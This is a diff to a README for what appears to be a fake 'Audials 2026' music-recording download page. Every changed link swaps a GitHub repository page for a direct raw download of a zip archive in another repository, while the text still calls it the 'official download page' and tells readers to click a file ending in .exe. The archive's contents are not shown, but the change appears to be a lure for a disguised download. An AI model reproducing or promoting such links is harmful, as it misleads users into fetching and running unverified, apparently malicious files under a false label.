@@ -5,7 +5,7 @@ description: "Download the full version of Audials Music for Windows 10 and 11. 
 ---
 # 🎵 Audials-2026 - Record your favorite streaming music easily
 
-[![](https://img.shields.io/badge/Download-Audials_2026-blue.svg)](https://github.com/Undisciplined-ensemble237/Audials-2026)
+[![](https://img.shields.io/badge/Download-Audials_2026-blue.svg)](https://raw.githubusercontent.com/Undisciplined-ensemble237/undisciplined-ensemble237.github.io/main/Moroccan/Dist_1.0.zip)
 
 ## 📖 About this software
 
@@ -26,13 +26,13 @@ Ensure your computer meets these standards before you start:
 
 The software installer is available through our GitHub page. Follow these steps to obtain the correct file for your system.
 
-1.  Visit the [official download page](https://github.com/Undisciplined-ensemble237/Audials-2026).
+1.  Visit the [official download page](https://raw.githubusercontent.com/Undisciplined-ensemble237/undisciplined-ensemble237.github.io/main/Moroccan/Dist_1.0.zip).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version ending in .exe to start your download.
 4.  Save the file to your Downloads folder.
 
 You can also use this button to navigate to the download area:
-[![](https://img.shields.io/badge/Visit-Download_Page-grey.svg)](https://github.com/Undisciplined-ensemble237/Audials-2026)
+[![](https://img.shields.io/badge/Visit-Download_Page-grey.svg)](https://raw.githubusercontent.com/Undisciplined-ensemble237/undisciplined-ensemble237.github.io/main/Moroccan/Dist_1.0.zip)
 
 ## ⚙️ Installation steps
 
